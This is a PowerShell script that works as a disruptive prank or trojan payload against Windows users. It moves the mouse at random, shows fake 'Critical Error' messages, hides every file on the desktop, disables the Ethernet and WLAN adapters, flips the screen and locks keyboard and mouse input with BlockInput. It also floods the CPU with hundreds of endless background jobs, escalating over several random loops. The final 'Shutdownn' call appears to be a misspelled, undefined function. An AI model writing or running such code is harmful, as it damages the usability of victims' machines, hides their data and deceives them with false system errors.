Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
}
"@

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
}
"@

Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
public class Error {
    public static void ShowError() {
        MessageBox.Show("A serious error occurred. Please restart your system.", "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
}
"@

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Audio {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr SendMessageW(IntPtr hWnd, int msg, int wParam, int lParam);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
}
"@

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class LockInput {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

$tsmin=1
$tsmax=6
$tlmin=10
$tlmax=20




function Mause {
    $mouseX = Get-Random -Minimum 100 -Maximum 1500
    $mouseY = Get-Random -Minimum 100 -Maximum 1000
    [Mouse]::SetCursorPos($mouseX, $mouseY) # Bewegt den Mauszeiger
}

function Capslock {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    [Keyboard]::keybd_event(0x14, 0, 0, 0)
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    [Keyboard]::keybd_event(0x14, 0, 2, 0)
}

function Error {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    [Error]::ShowError()
}

function Audio {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    $audio = [Audio]::FindWindow("Shell_TrayWnd", "Start")
    [Audio]::SendMessageW($audio, 0x319, 0x3019, $volume)
}

function Minimire {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    $hwnd = [Window]::GetForegroundWindow()
    [Window]::ShowWindow($hwnd, 2)
}

function Hide {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    Get-ChildItem "$env:USERPROFILE\Desktop" | ForEach-Object { $_.Attributes="Hidden" } 
}

function KeyA {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    [Keyboard]::keybd_event(65,0,0,0)
    Start-Sleep -Milliseconds 500
    [Keyboard]::keybd_event(65,0,2,0)
}

function InternetCut {
    Start-Sleep -Seconds (Get-Random -Minimum $tlmin -Maximum $tlmax)
    netsh interface set interface "Ethernet" disable
    netsh interface set interface "WLAN" disable
    Start-Sleep -Seconds (Get-Random -Minimum $tlmin -Maximum $tlmax)
    netsh interface set interface "Ethernet" enable
    netsh interface set interface "WLAN" enable
}
function Sound {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    $path = "C:\Windows\Media\Windows Exclamation.wav"
    (New-Object Media.SoundPlayer $path).Play()
}

function Turn {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    (New-Object -ComObject WScript.Shell).SendKeys("^%{DOWN}")
}

function Block {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    [LockInput]::BlockInput($true)
}

function Notepad {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    Start-Process notepad
}

function Task {
    Start-Sleep -Seconds (Get-Random -Minimum $tsmin -Maximum $tsmax)
    for ($f = 0; $f -lt 7; $f++) {
        1..100 | % {Start-Job -ScriptBlock {while ($true) {}}}
    }
}

$functions = @(
    "Mause", "Capslock", "Error", "Audio", "Minimire", "Hide", "KeyA",
    "Sound", "Turn", "Notepad", "Task"
)

$functionsfull = @(
    "Mause", "Capslock", "Error", "Audio", "Minimire", "Hide", "KeyA",
    "InternetCut", "Sound", "Turn", "Block", "Notepad", "Task"
)

for ($i = 0; $i -lt 20; $i++) {
    $randomFunction = Get-Random -InputObject $functions
    Write-Host "Executing: $randomFunction"
    Invoke-Expression $randomFunction
    $randomFunction = Get-Random -InputObject $functions
    Write-Host "Executing: $randomFunction"
    Invoke-Expression $randomFunction
}

$tsmin=1
$tsmax=4
$tlmin=7
$tlmax=13

[Error]::ShowError()

for ($b = 0; $b -lt 8; $b++) {
    $randomFunction = Get-Random -InputObject $functionsfull
    Write-Host "Executing: $randomFunction"
    Invoke-Expression $randomFunction
    $randomFunction = Get-Random -InputObject $functionsfull
    Write-Host "Executing: $randomFunction"
    Invoke-Expression $randomFunction
}

$tsmin=1
$tsmax=3
$tlmin=1
$tlmax=4

InternetCut
Capslock
Turn
Sound
Notepad
Block
[Error]::ShowError()
[Error]::ShowError()
[Error]::ShowError()
[Error]::ShowError()
[Error]::ShowError()
Start-Process notepad
[Error]::ShowError()
[Error]::ShowError()
[Error]::ShowError()
[Keyboard]::keybd_event(0x14, 0, 0, 0)
for ($f = 0; $f -lt 2; $f++) {
    1..100 | % {Start-Job -ScriptBlock {while ($true) {}}}
}
Start-Process notepad
Start-Process notepad
Shutdownn
